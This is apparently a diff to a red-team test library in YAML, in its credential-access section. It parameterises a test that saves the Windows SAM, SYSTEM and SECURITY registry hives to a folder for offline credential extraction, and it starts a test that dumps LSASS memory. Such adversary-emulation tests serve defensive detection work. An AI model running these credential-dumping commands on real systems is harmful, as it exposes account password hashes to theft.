@@ -19468,17 +19468,22 @@ credential-access:
         via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
       supported_platforms:
       - windows
+      input_arguments:
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam sam
-          reg save HKLM\system system
-          reg save HKLM\security security
+          reg save HKLM\sam "#{output_folder}\sam"
+          reg save HKLM\system "#{output_folder}\system"
+          reg save HKLM\security "#{output_folder}\security"
         cleanup_command: |
-          rm sam
-          rm system
-          rm security
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
